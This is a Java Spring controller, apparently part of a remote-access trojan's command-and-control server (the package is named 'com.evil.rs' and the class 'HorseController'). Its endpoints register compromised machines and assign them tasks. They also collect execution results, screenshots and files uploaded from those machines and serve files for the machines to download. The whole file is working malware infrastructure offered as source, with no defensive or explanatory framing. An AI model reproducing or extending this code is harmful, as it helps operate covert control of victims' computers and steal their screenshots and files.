package com.evil.rs.controller;

import com.alibaba.fastjson.JSON;
import com.evil.rs.annotation.Decrypt;
import com.evil.rs.annotation.Encrypt;
import com.evil.rs.config.ConstConfig;
import com.evil.rs.entity.Command;
import com.evil.rs.entity.Machine;
import com.evil.rs.entity.NotifyMessage;
import com.evil.rs.enums.CommonNumberEnums;
import com.evil.rs.enums.CommonStringEnums;
import com.evil.rs.enums.ExceptionEnums;
import com.evil.rs.exception.HandlerException;
import com.evil.rs.model.ReceiverModel;
import com.evil.rs.service.CommandService;
import com.evil.rs.service.MachineService;
import com.evil.rs.socket.WebSocketServer;
import com.evil.rs.utils.CustomFileUtil;
import com.evil.rs.utils.Result;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;

@Slf4j
@RestController
@RequestMapping("/client")
public class HorseController {

    @Autowired
    private MachineService machineService;

    @Autowired
    CommandService commandService;

    /**
     * @description 接受机器上线请求保存信息
     * @param machine 机器模型
     */
    @Decrypt
    @Encrypt
    @PostMapping("/machineInformation")
    public Result machineInformation(@RequestBody Machine machine) {
        machine.setCurrentProtocol(CommonStringEnums.HTTP_PROTOCOL.getDescription());
        return Result.Ok(machineService.getConfigByMachineInformation(machine));
    }

    /**
     * @description 获取任务列表
     * @param token 客户端根据token获取任务列表
     */
    @Decrypt
    @Encrypt
    @PostMapping("/tasklist")
    public Result taskList(@RequestHeader("token") String token) {
        return Result.Ok(commandService.listByToken(token));
    }

    /**
     * @description 返回任务执行结果
     * @param receiverModel 任务执行结果模型
     */
    @Decrypt
    @PostMapping("/receiver")
    public void receiver(
            @RequestHeader("token") String token,
            @RequestBody ReceiverModel receiverModel) {
        commandService.saveExecutionResult(token, receiverModel);
    }

    /**
     * @description 客户端上传一些文件
     * @param id 任务id
     * @param request 原始的请求
     */
    @PostMapping("/upload")
    public void upload(
            @RequestHeader("token") String token,
            @RequestHeader("id") String id,
            HttpServletRequest request) {
        Command command = commandService.getCommandByTokenAndId(token, id);
        if (command != null){
            // 上传截图
            if (command.getAction().equals(CommonNumberEnums.TASK_UPLOAD_CAPTURE.getCode())) {
                // 检查上传目录并创建
                File captureDirection = new File(ConstConfig.captureDirection);
                String filename = ConstConfig.captureDirection + id + ".png";
                Command command1 = CustomFileUtil.saveFile(captureDirection, filename, request, command);
                commandService.saveOrUpdate(command1);
            }
            // 上传文件
            if (command.getAction().equals(CommonNumberEnums.TASK_UPLOAD_FILE.getCode())) {
                File uploadDirection = new File(ConstConfig.uploadDirection);
                String absolutePath = command.getData();
                Path path = Paths.get(absolutePath);
                String filename = path.getFileName().toString();
                String fullPath = ConstConfig.uploadDirection + id + "-" + filename;
                Command command1 = CustomFileUtil.saveFile(uploadDirection, fullPath, request, command);
                commandService.saveOrUpdate(command1);
            }
            // 通知更新状态
            NotifyMessage notifyMessage = new NotifyMessage(CommonStringEnums.NOTIFY_TASK_UPDATE.getDescription(), JSON.toJSONString(command));
            WebSocketServer.notifyReceiver(command.getReceiver(), JSON.toJSONString(notifyMessage));
        }
    }

    /**
     * @description 下载控制的给的文件
     * @param token 客户端的token
     * @param id 任务id
     */
    @Decrypt
    @PostMapping("/download")
    public void download(
            @RequestHeader String token,
            @RequestBody String id,
            HttpServletResponse response) {
        String filename = commandService.getBinaryData(token, id);
        if (!filename.isEmpty()){
            String filePath = ConstConfig.downloadDirection + filename;
            try{
                ServletOutputStream outputStream = response.getOutputStream();
                response.setHeader("F", filename);
                outputStream.write(new FileInputStream(filePath).readAllBytes());
                // 通知更新任务状态
                Command command = commandService.getById(id);
                NotifyMessage notifyMessage = new NotifyMessage(CommonStringEnums.NOTIFY_TASK_UPDATE.getDescription(), JSON.toJSONString(command));
                WebSocketServer.notifyReceiver(command.getReceiver(), JSON.toJSONString(notifyMessage));
            } catch (Exception e) {
                log.info("机器[{}]下载任务[{}]文件失败,错误信息:[{e}]", token, id);
            }
        }
    }

}
